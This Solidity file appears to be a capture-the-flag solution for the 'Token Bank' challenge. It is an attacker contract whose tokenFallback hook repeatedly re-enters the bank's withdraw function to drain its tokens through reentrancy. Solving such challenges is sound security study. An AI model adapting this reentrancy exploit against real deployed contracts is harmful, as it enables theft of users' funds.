pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface ISimpleERC223Token {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ITokenBankChallenge {
    function withdraw(uint256) external;
    function isComplete() external view returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract TokenBankChallengeAttacker {

    ISimpleERC223Token token;
    ITokenBankChallenge challenge;

    constructor(address tokenAddress, address challengeAddress) {
        token = ISimpleERC223Token(tokenAddress);
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function depositToBank() public {
        uint256 value = token.balanceOf(address(this));
        bool success = token.transfer(address(challenge), value);
        require(success);
    }

    function tokenFallback(address from, uint256, bytes calldata) public {
        require(msg.sender == address(token));
        if (from == address(challenge)) {
            attack();
        }
    }

    function attack() public {
        uint256 attackerBalanceInBank = challenge.balanceOf(address(this));
        uint256 bankBalance = token.balanceOf(address(challenge));
        uint256 amount = attackerBalanceInBank < bankBalance ? attackerBalanceInBank : bankBalance;
        console.log("attack(): ", attackerBalanceInBank, bankBalance, amount);
        if (amount != 0) {
            challenge.withdraw(amount);
        }
    }

}
